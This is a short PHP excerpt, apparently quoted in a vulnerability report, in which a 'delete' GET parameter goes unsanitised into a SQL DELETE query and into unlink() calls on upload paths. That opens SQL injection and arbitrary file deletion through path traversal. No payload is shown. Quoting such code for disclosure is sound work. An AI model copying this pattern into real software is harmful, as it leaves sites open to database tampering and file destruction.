	41.	if($_GET['delete'])

	42.	{

	43.		$filename = $_GET['delete'];

	44.		$sql = $db -> db_query("DELETE FROM " . DB_PREFIX . "images

	45.		WHERE filename = '$filename'");

	46.

	47.		unlink(LOVE_ROOT . '/uploads/' . $filename);

	48.		unlink(LOVE_ROOT . '/uploads/thumbs/' . $filename);

	49.

	50.		redirect_with_message('msg', 'LANG_088');

		rest of the code block doesn't matters
